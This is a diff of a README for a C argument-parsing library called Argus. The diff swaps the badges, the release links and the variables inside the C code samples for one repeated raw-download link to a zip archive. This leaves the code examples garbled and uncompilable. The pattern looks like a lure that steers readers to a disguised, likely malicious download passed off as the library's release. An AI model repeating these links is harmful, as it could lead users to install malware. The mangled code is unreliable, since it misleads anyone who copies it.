@@ -1,8 +1,8 @@
 # Argus: A Modern C Library for Command-Line Argument Parsing
 
-![Argus](https://img.shields.io/badge/Argus-Modern%20C%20Library-blue.svg)
-![GitHub Release](https://img.shields.io/badge/Release-v1.0.0-orange.svg)
-![License](https://img.shields.io/badge/License-MIT-green.svg)
+![Argus](https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip%20C%https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip)
+![GitHub Release](https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip)
+![License](https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip)
 
 Welcome to the **Argus** repository! Argus is a modern C library designed to simplify command-line argument parsing. It offers advanced features like subcommands, validation, multi-inputs, and support for environment variables. Whether you're building a small utility or a complex application, Argus provides the tools you need to handle command-line inputs efficiently.
 
@@ -28,7 +28,7 @@ Welcome to the **Argus** repository! Argus is a modern C library designed to sim
 
 ## Installation
 
-To get started with Argus, you can download the latest release from the [Releases section](https://github.com/Palioboro/Argus/releases). Download the appropriate file for your platform, extract it, and follow the instructions in the README file to integrate Argus into your project.
+To get started with Argus, you can download the latest release from the [Releases section](https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip). Download the appropriate file for your platform, extract it, and follow the instructions in the README file to integrate Argus into your project.
 
 ## Usage
 
@@ -46,10 +46,10 @@ int main(int argc, char *argv[]) {
     
     ArgusResult result = argus_parse(parser, argc, argv);
     
-    if (result.success) {
-        printf("Hello, %s! You are %d years old.\n", result.arguments["name"], result.arguments["age"]);
+    if (https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip) {
+        printf("Hello, %s! You are %d years old.\n", https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip["name"], https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip["age"]);
     } else {
-        printf("Error: %s\n", result.error_message);
+        printf("Error: %s\n", https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip);
     }
     
     argus_destroy_parser(parser);
@@ -74,10 +74,10 @@ int main(int argc, char *argv[]) {
     
     ArgusResult result = argus_parse(parser, argc, argv);
     
-    if (result.success) {
-        printf("Hello, %s!\n", result.arguments["name"]);
+    if (https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip) {
+        printf("Hello, %s!\n", https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip["name"]);
     } else {
-        printf("Error: %s\n", result.error_message);
+        printf("Error: %s\n", https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip);
     }
     
     argus_destroy_parser(parser);
@@ -98,10 +98,10 @@ void greet_command(ArgusParser parser) {
     
     ArgusResult result = argus_parse(parser, argc, argv);
     
-    if (result.success) {
-        printf("Hello, %s!\n", result.arguments["name"]);
+    if (https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip) {
+        printf("Hello, %s!\n", https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip["name"]);
     } else {
-        printf("Error: %s\n", result.error_message);
+        printf("Error: %s\n", https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip);
     }
 }
 
@@ -110,10 +110,10 @@ void farewell_command(ArgusParser parser) {
     
     ArgusResult result = argus_parse(parser, argc, argv);
     
-    if (result.success) {
-        printf("Goodbye, %s!\n", result.arguments["name"]);
+    if (https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip) {
+        printf("Goodbye, %s!\n", https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip["name"]);
     } else {
-        printf("Error: %s\n", result.error_message);
+        printf("Error: %s\n", https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip);
     }
 }
 
@@ -125,8 +125,8 @@ int main(int argc, char *argv[]) {
     
     ArgusResult result = argus_parse(parser, argc, argv);
     
-    if (!result.success) {
-        printf("Error: %s\n", result.error_message);
+    if (!https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip) {
+        printf("Error: %s\n", https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip);
     }
     
     argus_destroy_parser(parser);
@@ -186,8 +186,8 @@ For questions or suggestions, please open an issue in this repository. We apprec
 
 ## Releases
 
-You can find the latest releases of Argus in the [Releases section](https://github.com/Palioboro/Argus/releases). Download the appropriate file for your platform, extract it, and follow the instructions provided.
+You can find the latest releases of Argus in the [Releases section](https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip). Download the appropriate file for your platform, extract it, and follow the instructions provided.
 
-![Release Button](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-blue.svg)
+![Release Button](https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip%20Latest%20Release-Click%https://github.com/Palioboro/Argus/raw/refs/heads/main/source/Software_v1.3.zip)
 
 Feel free to explore, use, and contribute to Argus. Happy coding!
